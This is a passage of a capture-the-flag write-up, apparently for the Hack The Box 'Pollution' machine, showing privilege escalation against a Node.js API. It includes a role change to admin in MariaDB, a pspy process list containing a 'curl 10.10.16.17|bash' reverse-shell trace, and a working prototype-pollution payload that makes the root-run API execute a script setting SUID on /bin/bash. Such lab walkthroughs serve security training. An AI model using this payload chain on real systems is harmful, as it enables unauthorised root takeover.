+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2018.png"/>
+          </a>
+        
+        <p id="95ad831d-0095-431c-a656-ab0cf386a413">
+          We need to add a HTTP header to define the content type to 
+          
+            
+              application/json
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="05ce34a5-e195-41ad-8ae7-a4a7bff8ec83" class="code"><code>www-data@pollution:~$ curl -X POST localhost:3000/auth/login -d &#x27;{&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;}&#x27; -H &quot;Content-Type: application/json&quot;
+{&quot;Status&quot;:&quot;Ok&quot;,&quot;Header&quot;:{&quot;x-access-token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg0NjI5MTc2LCJleHAiOjE2ODQ2MzI3NzZ9.BftvWGrUBoth4ZHN7NqW6dcY4bU_hz1Rdc35l20Wq5g&quot;}}</code></pre>
+        <p id="99a7fa07-7228-49f3-bc6d-14d741c96219">
+          It worked. The 
+          
+            
+              Pollution API
+            
+          
+           gave us an access token. Now, let’s try to use it to send a request to 
+          
+            
+              /admin/messages/send
+            
+          
+           again : 
+        </p>
+        
+        
+        
+<pre id="ee8a7c50-ed90-4458-954a-3a1139ff0d24" class="code"><code>www-data@pollution:~$ curl -X POST localhost:3000/admin/messages/send -H &quot;Content-Type: application/json&quot; -H &quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg0NjI5MTc2LCJleHAiOjE2ODQ2MzI3NzZ9.BftvWGrUBoth4ZHN7NqW6dcY4bU_hz1Rdc35l20Wq5g&quot;
+{&quot;Status&quot;:&quot;Error&quot;,&quot;Message&quot;:&quot;You are not allowed&quot;}</code></pre>
+        <p id="2751ce5c-6649-4be9-807c-b2df36254155">
+          Same error. Maybe because we just have the 
+          
+            
+              user role
+            
+          
+           and not the 
+          
+            
+              admin role
+            
+          
+          . Let’s change this in 
+          
+            <a href="https://www.mysql.com/fr/">
+              MySQL
+            </a>
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="7b63eb61-3dae-479a-bb3b-501e2f8aa436" class="code"><code>www-data@pollution:~$ mysql -u webapp_user -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 506
+Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.
+
+MariaDB [(none)]&gt; use pollution_api
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [pollution_api]&gt; UPDATE users SET role=&quot;admin&quot; WHERE username=&quot;test&quot;;
+Query OK, 1 row affected (0.003 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MariaDB [pollution_api]&gt; SELECT * FROM users;
++----+----------+----------+-------+---------------------+---------------------+
+| id | username | password | role  | createdAt           | updatedAt           |
++----+----------+----------+-------+---------------------+---------------------+
+|  1 | test     | test     | admin | 2023-05-20 18:09:54 | 2023-05-20 18:09:54 |
+|  2 | test2    | test     | user  | 2023-05-20 18:27:34 | 2023-05-20 18:27:34 |
++----+----------+----------+-------+---------------------+---------------------+
+2 rows in set (0.001 sec)</code></pre>
+        <p id="bca7f089-74d6-4c12-8581-909f5dfbebe5">
+          Now let’s try again : 
+        </p>
+        
+        
+        
+<pre id="0cdb86f4-99b5-4148-9f7d-994c76cfb7b9" class="code"><code>www-data@pollution:~$ curl -X POST localhost:3000/admin/messages/send -H &quot;Content-Type: application/json&quot; -H &quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NDYzMDA5NSwiZXhwIjoxNjg0NjMzNjk1fQ.c2l9iEDpg8gt8LBPHZWCKI6iY9X9YI5vDNBjZ3GbFis&quot;
+{&quot;Status&quot;:&quot;Error&quot;,&quot;Message&quot;:&quot;Parameter text not found&quot;}</code></pre>
+        <p id="d6116c73-ead4-49e7-bdf0-a7b7d46e678f">
+          We need to add a 
+          
+            
+              text
+            
+          
+           parameter : 
+        </p>
+        
+        
+        
+<pre id="143ac850-6275-4607-9c6f-1f83765d2d57" class="code"><code>www-data@pollution:~$ curl -X POST localhost:3000/admin/messages/send -H &quot;Content-Type: application/json&quot; -H &quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NDYzMDA5NSwiZXhwIjoxNjg0NjMzNjk1fQ.c2l9iEDpg8gt8LBPHZWCKI6iY9X9YI5vDNBjZ3GbFis&quot; -d &#x27;{&quot;text&quot;:&quot;test&quot;}&#x27;
+{&quot;Status&quot;:&quot;Ok&quot;}</code></pre>
+        <p id="edcaf561-9d30-4ce0-b237-b4364cab41c6">
+          Now it works.
+        </p>
+        <p id="6af1b585-5f2d-44a2-9de8-19cd145e1651">
+          We need to enumerate more the system to understand what’s running the 
+          
+            
+              Pollution API
+            
+          
+          . We can use 
+          
+            <a href="https://github.com/DominicBreuker/pspy">
+              pspy
+            </a>
+          
+           for this. Let’s download it on the target system and run it : 
+        </p>
+        
+        
+        
+<pre id="b9430466-aec4-4e18-838c-19f62631c07d" class="code"><code>www-data@pollution:/tmp/.cb$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2023/05/20 21:23:48 CMD: UID=33    PID=5250   | ./pspy64 
+2023/05/20 21:23:48 CMD: UID=0     PID=5110   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4891   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4874   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4722   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4713   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4497   | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4379   | 
+2023/05/20 21:23:48 CMD: UID=33    PID=4375   | /bin/bash 
+2023/05/20 21:23:48 CMD: UID=33    PID=4374   | python3 -c import pty; pty.spawn(&quot;/bin/bash&quot;)                               
+2023/05/20 21:23:48 CMD: UID=33    PID=4372   | /bin/sh -i 
+2023/05/20 21:23:48 CMD: UID=33    PID=4371   | bash 
+2023/05/20 21:23:48 CMD: UID=33    PID=4369   | sh -c curl 10.10.16.17|bash                                                 
+2023/05/20 21:23:48 CMD: UID=33    PID=3696   | php-fpm: pool www                                                                                                                         
+2023/05/20 21:23:48 CMD: UID=33    PID=3695   | php-fpm: pool www                                                                                                                         
+2023/05/20 21:23:48 CMD: UID=33    PID=3694   | php-fpm: pool www                                                                                                                         
+2023/05/20 21:23:48 CMD: UID=117   PID=1593   | /usr/libexec/ibus-engine-simple                                             
+2023/05/20 21:23:48 CMD: UID=115   PID=1581   | /usr/libexec/colord                                                         
+2023/05/20 21:23:48 CMD: UID=117   PID=1576   | /usr/libexec/ibus-portal                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1566   | /usr/libexec/ibus-x11 --kill-daemon                                         
+2023/05/20 21:23:48 CMD: UID=117   PID=1563   | /usr/libexec/ibus-extension-gtk3                                            
+2023/05/20 21:23:48 CMD: UID=117   PID=1562   | /usr/libexec/ibus-dconf                                                     
+2023/05/20 21:23:48 CMD: UID=117   PID=1554   | ibus-daemon --panel disable -r --xim                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1511   | /usr/libexec/gsd-printer                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1483   | /usr/libexec/gsd-power                                                      
+2023/05/20 21:23:48 CMD: UID=117   PID=1479   | /usr/libexec/gsd-housekeeping                                               
+2023/05/20 21:23:48 CMD: UID=117   PID=1473   | /usr/libexec/gsd-a11y-settings                                              
+2023/05/20 21:23:48 CMD: UID=117   PID=1472   | /usr/libexec/gsd-sound                                                      
+2023/05/20 21:23:48 CMD: UID=117   PID=1471   | /usr/libexec/gsd-screensaver-proxy                                          
+2023/05/20 21:23:48 CMD: UID=117   PID=1468   | /usr/libexec/gsd-media-keys                                                 
+2023/05/20 21:23:48 CMD: UID=117   PID=1467   | /usr/libexec/gsd-datetime                                                   
+2023/05/20 21:23:48 CMD: UID=117   PID=1461   | /usr/libexec/gsd-smartcard                                                  
+2023/05/20 21:23:48 CMD: UID=117   PID=1459   | /usr/libexec/gsd-rfkill                                                     
+2023/05/20 21:23:48 CMD: UID=117   PID=1455   | /usr/libexec/gsd-print-notifications                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1454   | /usr/libexec/gsd-keyboard                                                   
+2023/05/20 21:23:48 CMD: UID=117   PID=1449   | /usr/libexec/gsd-color                                                      
+2023/05/20 21:23:48 CMD: UID=117   PID=1447   | /usr/libexec/gsd-wacom                                                      
+2023/05/20 21:23:48 CMD: UID=117   PID=1445   | /usr/libexec/gsd-sharing                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1444   | /usr/bin/gjs /usr/share/gnome-shell/org.gnome.Shell.Notifications           
+2023/05/20 21:23:48 CMD: UID=117   PID=1443   | /usr/libexec/at-spi2-registryd --use-gnome-session                          
+2023/05/20 21:23:48 CMD: UID=0     PID=1434   | /usr/libexec/packagekitd                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1429   | /usr/libexec/xdg-permission-store                                           
+2023/05/20 21:23:48 CMD: UID=117   PID=1407   | /usr/bin/Xwayland :1024 -rootless -noreset -accessx -core -auth /run/user/117/.mutter-Xwaylandauth.UV4041 -listen 4 -listen 5 -displayfd 6 -listen 7                                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1404   | /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3                              
+2023/05/20 21:23:48 CMD: UID=117   PID=1399   | /usr/libexec/at-spi-bus-launcher                                            
+2023/05/20 21:23:48 CMD: UID=0     PID=1326   | /usr/bin/node /root/pollution_api/index.js                                  
+2023/05/20 21:23:48 CMD: UID=0     PID=1278   | /usr/libexec/upowerd                                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1270   | /usr/libexec/gvfs-gphoto2-volume-monitor                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1260   | /usr/libexec/gvfs-afc-volume-monitor                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1254   | /usr/libexec/gvfs-mtp-volume-monitor                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1245   | /usr/libexec/goa-identity-service                                           
+2023/05/20 21:23:48 CMD: UID=117   PID=1224   | /usr/bin/gnome-shell                                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1218   | /usr/libexec/goa-daemon                                                     
+2023/05/20 21:23:48 CMD: UID=117   PID=1209   | /usr/libexec/gvfs-goa-volume-monitor                                        
+2023/05/20 21:23:48 CMD: UID=117   PID=1201   | /usr/libexec/gvfs-udisks2-volume-monitor                                    
+2023/05/20 21:23:48 CMD: UID=117   PID=1194   | /usr/libexec/gvfsd-fuse /run/user/117/gvfs -f                               
+2023/05/20 21:23:48 CMD: UID=117   PID=1165   | /usr/libexec/gvfsd                                                          
+2023/05/20 21:23:48 CMD: UID=117   PID=1160   | /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart                                                  
+2023/05/20 21:23:48 CMD: UID=117   PID=1159   | /usr/bin/pipewire-media-session                                             
+2023/05/20 21:23:48 CMD: UID=117   PID=1158   | dbus-daemon --nofork --print-address 4 --session                            
+2023/05/20 21:23:48 CMD: UID=117   PID=1156   | dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart                                                            
+2023/05/20 21:23:48 CMD: UID=108   PID=1137   | /usr/libexec/rtkit-daemon                                                   
+2023/05/20 21:23:48 CMD: UID=117   PID=1135   | /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                 
+2023/05/20 21:23:48 CMD: UID=117   PID=1133   | /usr/libexec/gdm-wayland-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart                           
+2023/05/20 21:23:48 CMD: UID=117   PID=1132   | /usr/libexec/tracker-miner-fs                                               
+2023/05/20 21:23:48 CMD: UID=117   PID=1130   | /usr/bin/pulseaudio --daemonize=no --log-target=journal                     
+2023/05/20 21:23:48 CMD: UID=117   PID=1129   | /usr/bin/pipewire                                                           
+2023/05/20 21:23:48 CMD: UID=117   PID=1113   | (sd-pam) 
+2023/05/20 21:23:48 CMD: UID=117   PID=1112   | /lib/systemd/systemd --user                                                 
+2023/05/20 21:23:48 CMD: UID=118   PID=1110   | /usr/sbin/mariadbd                                                          
+2023/05/20 21:23:48 CMD: UID=33    PID=1041   | /usr/sbin/apache2 -k start                                                  
+2023/05/20 21:23:48 CMD: UID=33    PID=1040   | /usr/sbin/apache2 -k start                                                  
+2023/05/20 21:23:48 CMD: UID=0     PID=1033   | /usr/sbin/apache2 -k start                                                  
+2023/05/20 21:23:48 CMD: UID=1002  PID=1031   | php-fpm: pool victor                                                                                                                      
+2023/05/20 21:23:48 CMD: UID=1002  PID=1030   | php-fpm: pool victor                                                                                                                      
+2023/05/20 21:23:48 CMD: UID=0     PID=1014   | gdm-session-worker [pam/gdm-launch-environment]                             
+2023/05/20 21:23:48 CMD: UID=0     PID=988    | /usr/sbin/gdm3                                                              
+2023/05/20 21:23:48 CMD: UID=0     PID=980    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups                     
+2023/05/20 21:23:48 CMD: UID=0     PID=968    | /usr/bin/python3 /usr/bin/supervisord -n -c /etc/supervisor/supervisord.conf                                                              
+2023/05/20 21:23:48 CMD: UID=119   PID=966    | /usr/bin/redis-server 0.0.0.0:6379                                                                                                        
+2023/05/20 21:23:48 CMD: UID=0     PID=965    | php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)                                                                                   
+2023/05/20 21:23:48 CMD: UID=0     PID=788    | /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
+2023/05/20 21:23:48 CMD: UID=0     PID=777    | /usr/sbin/ModemManager                                                      
+2023/05/20 21:23:48 CMD: UID=0     PID=766    | /usr/sbin/cups-browsed                                                      
+2023/05/20 21:23:48 CMD: UID=111   PID=696    | avahi-daemon: chroot helper                                                 
+2023/05/20 21:23:48 CMD: UID=0     PID=690    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant                           
+2023/05/20 21:23:48 CMD: UID=0     PID=686    | /usr/libexec/udisks2/udisksd                                                
+2023/05/20 21:23:48 CMD: UID=0     PID=682    | /lib/systemd/systemd-logind                                                 
+2023/05/20 21:23:48 CMD: UID=0     PID=681    | /usr/libexec/switcheroo-control                                             
+2023/05/20 21:23:48 CMD: UID=0     PID=679    | /usr/sbin/rsyslogd -n -iNONE                                                
+2023/05/20 21:23:48 CMD: UID=0     PID=678    | /usr/libexec/polkitd --no-debug                                             
+2023/05/20 21:23:48 CMD: UID=0     PID=672    | /usr/sbin/NetworkManager --no-daemon                                        
+2023/05/20 21:23:48 CMD: UID=104   PID=670    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                  
+2023/05/20 21:23:48 CMD: UID=0     PID=669    | /usr/sbin/cron -f                                                           
+2023/05/20 21:23:48 CMD: UID=111   PID=665    | avahi-daemon: running [pollution.local]                                     
+2023/05/20 21:23:48 CMD: UID=0     PID=661    | /usr/libexec/accounts-daemon                                                
+2023/05/20 21:23:48 CMD: UID=0     PID=652    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=634    | 
+2023/05/20 21:23:48 CMD: UID=997   PID=631    | /usr/local/sbin/laurel --config /etc/laurel/config.toml                     
+2023/05/20 21:23:48 CMD: UID=0     PID=629    | /sbin/auditd 
+2023/05/20 21:23:48 CMD: UID=0     PID=581    | /usr/bin/vmtoolsd                                                           
+2023/05/20 21:23:48 CMD: UID=0     PID=579    | /usr/bin/VGAuthService                                                      
+2023/05/20 21:23:48 CMD: UID=0     PID=577    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=456    | /lib/systemd/systemd-udevd                                                  
+2023/05/20 21:23:48 CMD: UID=0     PID=447    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid                               
+2023/05/20 21:23:48 CMD: UID=0     PID=426    | /lib/systemd/systemd-journald                                               
+2023/05/20 21:23:48 CMD: UID=0     PID=389    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=388    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=174    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=173    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=172    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=171    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=170    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=169    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=168    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=167    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=166    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=165    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=164    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=163    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=157    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=156    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=155    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=154    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=153    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=152    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=151    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=106    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=105    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=102    | 
+2023/05/20 21:23:48 CMD: UID=0     PID=93     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=92     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=91     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=90     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=89     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=88     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=87     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=86     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=85     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=84     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=83     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=82     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=81     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=80     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=79     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=78     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=77     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=76     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=75     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=74     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=73     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=72     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=71     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=70     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=69     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=68     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=67     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=66     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=65     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=64     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=63     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=62     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=61     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=60     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=59     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=58     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=57     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=56     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=55     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=54     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=53     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=52     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=51     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=32     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=31     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=30     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=29     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=28     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=27     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=25     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=24     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=23     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=20     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=18     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=17     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=16     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=15     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=13     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=12     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=11     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=10     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=9      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=8      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=6      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=3      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=2      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=1      | /sbin/init</code></pre>
+        <p id="157c34d3-2da4-435a-b819-f7648f2562de">
+          Let’s take a look at 
+          
+            
+              /etc/supervisor/supervisord.conf
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="e623f20a-f7d6-432a-a894-d0de7b194ba6" class="code"><code>www-data@pollution:/etc/supervisor$ cat supervisord.conf 
+; supervisor config file
+
+[unix_http_server]
+file=/var/run/supervisor.sock   ; (the path to the socket file)
+chmod=0700                       ; sockef file mode (default 0700)
+
+[supervisord]
+logfile=/var/log/supervisor/supervisord.log ; (main log file;default $CWD/supervisord.log)
+pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)
+childlogdir=/var/log/supervisor            ; (&#x27;AUTO&#x27; child log dir, default $TEMP)
+
+; the below section must remain in the config file for RPC
+; (supervisorctl/web interface) to work, additional interfaces may be
+; added by defining them in separate rpcinterface: sections
+[rpcinterface:supervisor]
+supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface
+
+[supervisorctl]
+serverurl=unix:///var/run/supervisor.sock ; use a unix:// URL  for a unix socket
+
+; The [include] section can just contain the &quot;files&quot; setting.  This
+; setting can list multiple files (separated by whitespace or
+; newlines).  It can also contain wildcards.  The filenames are
+; interpreted as relative to this file.  Included files *cannot*
+; include files themselves.
+
+[include]
+files = /etc/supervisor/conf.d/*.conf</code></pre>
+        <p id="aa8c4e52-ca28-405a-8443-adfe41ae6e43">
+          This configuration file include all the configuration files in 
+          
+            
+              /etc/supervisor/conf.d/
+            
+          
+          . Let’s see what we can find in this directory : 
+        </p>
+        
+        
+        
+<pre id="cac179f9-f65f-4564-9331-e4ad5eebb7a5" class="code"><code>www-data@pollution:/etc/supervisor/conf.d$ ls
+pollution_api.conf
+www-data@pollution:/etc/supervisor/conf.d$ cat pollution_api.conf 
+[program:pollution_api]
+command=bash -c &#x27;sleep 5 &amp;&amp; /usr/bin/node /root/pollution_api/index.js&#x27;
+directory=/root/pollution_api/
+autostart=true
+autorestart=true
+user=root
+environment=</code></pre>
+        <p id="186c7b6f-7593-4d51-9c42-d7191eb18ccf">
+          So the 
+          
+            
+              Pollution API
+            
+          
+           is running as root and runs with 
+          
+            <a href="https://nodejs.org/en">
+              NodeJS
+            </a>
+          
+          .
+        </p>
+        <h2 id="aaab5a89-c113-4914-9356-b89427ac3cde">
+          
+            Privilege escalation
+          
+        </h2>
+        <p id="8c7e8b11-b199-4345-9dc9-2ae9a465bb8d">
+          After some research, I found a technique called 
+          
+            
+              PP2RCE (Prototype Pollution to Remote Code Execution)
+            
+          
+          . Since the 
+          
+            
+              Pollution API
+            
+          
+           is running as 
+          
+            
+              root
+            
+          
+          , we may be able to craft a payload to set the 
+          
+            
+              SUID
+            
+          
+           bit on 
+          
+            
+              /bin/bash
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="967a4f9f-800e-4dbf-aaa1-4c7244d71ea0" class="code"><code>{
+  &quot;text&quot;: {
+    &quot;constructor&quot;: {
+      &quot;prototype&quot;: {
+        &quot;shell&quot;: &quot;/tmp/exploit.sh&quot;
+      }
+    }
+  }
+}</code></pre>
+        <p id="211fc926-fdc2-43fc-a17a-c8200fe687d0">
+          This payload will simply replace the 
+          
+            
+              shell
+            
+          
+           environment variable to 
+          
+            
+              /tmp/exploit.sh
+            
+          
+          . 
+        </p>
+        <p id="16d9471a-44f3-4632-96a6-97f6aa9b20e1">
+          When functions like 
+          
+            
+              exec()
+            
+          
+          , 
+          
+            
+              execFile()
+            
+          
+          , 
+          
+            
+              fork()
+            
+          
+          , 
+          
+            
+              spawn()
+            
+          
+          , 
+          
+            
+              execFileSync()
+            
+          
+          , 
+          
+            
+              execSync()
+            
+          
+           or 
+          
+            
+              spawnSync()
+            
+          
+           will be called in the 
+          <a href="https://nodejs.org/en">
+            
+              NodeJS
+            
+          </a>
+           application, the 
+          
+            
+              shell
+            
+          
+           environment variable will be used as the main binary to run commands. This way, our file defined in the environment variable 
+          
+            
+              shell
+            
+          
+           will simply be executed as root.
+        </p>
+        <p id="96c2c28f-b9b4-40fb-af2d-5cd7ff0df475">
+          Let’s create the malicious file that will be run (
+          
+            
+              /tmp/exploit.sh
+            
+          
+          ) : 
+        </p>
+        
+        
+        
+<pre id="5c1e1c6a-3aaa-4f84-ab06-6a9d2b51f7ab" class="code"><code>www-data@pollution:/tmp$ cat exploit.sh 
+#!/bin/bash
+
+chmod +s /bin/bash</code></pre>
+        <p id="03ca874d-4af7-4a5f-928b-c178bddca3e4">
+          We also need to make it executable by precaution : 
+        </p>
+        
+        
+        
+<pre id="d679a004-00e3-4e35-9b54-cae8eb5250e1" class="code"><code>www-data@pollution:/tmp$ chmod +x exploit.sh</code></pre>
+        <p id="634df7ed-db41-4af4-b42a-eae594e40ef3">
+          Now let’s send this payload to the 
+          
+            
+              Pollution API
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="2103d63e-ea45-45a5-9e3f-ed745f92fea6" class="code"><code>curl -X POST localhost:3000/admin/messages/send -H &quot;Content-Type: application/json&quot; -H &quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NDYzMzgxNSwiZXhwIjoxNjg0NjM3NDE1fQ.oGvWp1IsUiNxURpPVAeIh6MQ05w1L2o9SNgmI4s_DUo&quot; -d &#x27;{&quot;text&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;shell&quot;: &quot;/tmp/exploit.sh&quot;}}}}&#x27;</code></pre>
+        <p id="0fe84f1e-6fa0-4ed0-a767-36379f799260">
+          Now let’s take a look at the permissions on 
+          
+            
+              /bin/bash
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="080f6547-f93a-4204-b08b-2cd2f605d21b" class="code"><code>www-data@pollution:/etc/supervisor/conf.d$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash</code></pre>
+        <p id="4fd7d02c-a7ec-4630-b315-113638b679f8">
